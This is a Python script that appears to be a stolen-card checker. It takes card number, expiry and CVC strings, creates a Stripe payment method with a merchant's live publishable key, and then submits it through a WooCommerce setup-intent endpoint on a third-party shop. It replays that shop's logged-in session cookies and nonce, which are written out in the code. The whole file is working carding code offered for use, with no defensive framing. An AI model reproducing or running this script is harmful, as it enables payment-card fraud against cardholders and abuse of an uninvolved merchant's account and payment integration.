import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2Faaa289431e%3B+stripe-js-v3%2Faaa289431e%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbespokeutilitydesign.uk&time_on_page=306496&client_attribution_metadata[client_session_id]=2e317641-f7e3-4f50-90af-8a6ca19c415b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=44abcce4-8529-4687-ae79-b79b80fc30d5&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=NA&muid=NA&sid=NA&key=pk_live_51QjnPV2MjoKV3YuRePNjSPTGO3FHCRCYwZLtGRtRvQRuKVINj96iZlxGdx6jukb5uYQQGWPq04ClZYwIIChOQis9007yEEZqcf&_stripe_version=2024-06-20'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	
	cookies = {
	    'wordpress_sec_d54127facf26163901c7742e75741c76': 'waow%7C1772605369%7CIORZTlx2nVbIyvjVSOh2PHqwqQTc71JbTCoteAWKxz6%7Cecc60f65ee304744055099a28cc08adc7eb167a25b9926a4ed74521956bcab07',
	    '_ga': 'GA1.1.1575939560.1770368766',
	    '_gcl_au': '1.1.262757717.1770368766',
	    '__stripe_mid': '549544fc-8682-4fe4-8bdd-a1433c1eb02124a8a6',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2026-02-18%2005%3A25%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fpayment-methods%2F',
	    'sbjs_first_add': 'fd%3D2026-02-18%2005%3A25%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fpayment-methods%2F',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
	    '__stripe_sid': '89111295-bcfa-42dc-a816-b2b5192b8120e754cc',
	    'wordpress_test_cookie': 'WP%20Cookie%20check',
	    'stackprotect': '41bf66da1e0340083b11d7a5efeef448b6adab5cd88ec64ffb0c932cb225604c',
	    'wordpress_logged_in_d54127facf26163901c7742e75741c76': 'waow%7C1772605369%7CIORZTlx2nVbIyvjVSOh2PHqwqQTc71JbTCoteAWKxz6%7C827cc10ee27b61410150ced65fab65fd8b86501417de431aab4fb3b38f4234c0',
	    'tk_ai': 'woo%3A9aeGzHHYYMc62YZMpWjwS0Es',
	    'sbjs_session': 'pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F',
	    '_ga_WVQWTK679F': 'GS2.1.s1771394116$o7$g1$t1771395849$j60$l0$h0',
	}
	
	headers = {
	    'authority': 'bespokeutilitydesign.uk',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'wordpress_sec_d54127facf26163901c7742e75741c76=waow%7C1772605369%7CIORZTlx2nVbIyvjVSOh2PHqwqQTc71JbTCoteAWKxz6%7Cecc60f65ee304744055099a28cc08adc7eb167a25b9926a4ed74521956bcab07; _ga=GA1.1.1575939560.1770368766; _gcl_au=1.1.262757717.1770368766; __stripe_mid=549544fc-8682-4fe4-8bdd-a1433c1eb02124a8a6; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-02-18%2005%3A25%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2026-02-18%2005%3A25%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=89111295-bcfa-42dc-a816-b2b5192b8120e754cc; wordpress_test_cookie=WP%20Cookie%20check; stackprotect=41bf66da1e0340083b11d7a5efeef448b6adab5cd88ec64ffb0c932cb225604c; wordpress_logged_in_d54127facf26163901c7742e75741c76=waow%7C1772605369%7CIORZTlx2nVbIyvjVSOh2PHqwqQTc71JbTCoteAWKxz6%7C827cc10ee27b61410150ced65fab65fd8b86501417de431aab4fb3b38f4234c0; tk_ai=woo%3A9aeGzHHYYMc62YZMpWjwS0Es; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbespokeutilitydesign.uk%2Fmy-account%2Fadd-payment-method%2F; _ga_WVQWTK679F=GS2.1.s1771394116$o7$g1$t1771395849$j60$l0$h0',
	    'origin': 'https://bespokeutilitydesign.uk',
	    'referer': 'https://bespokeutilitydesign.uk/my-account/add-payment-method/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'wc_stripe_create_and_confirm_setup_intent',
	    'wc-stripe-payment-method': f'{pm}',
	    'wc-stripe-payment-type': 'card',
	    '_ajax_nonce': 'ba60731426',
	}
	
	r2 = requests.post('https://bespokeutilitydesign.uk/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
